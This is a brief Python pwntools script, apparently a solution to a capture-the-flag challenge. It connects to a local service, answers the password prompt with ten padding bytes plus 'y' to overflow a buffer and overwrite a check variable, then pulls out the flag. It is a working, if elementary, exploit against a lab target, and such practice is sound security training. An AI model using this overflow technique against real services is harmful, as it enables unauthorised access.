from pwn import *
import re

r = remote('localhost', 12366, level='debug')

# Receive prompt
r.recvuntil(b'Enter the password:\n')

# Send 10 bytes of padding and override y
r.sendline(b'__________y')

print(re.search(r"flag-[\w-]+", r.recvall().decode()).group(0))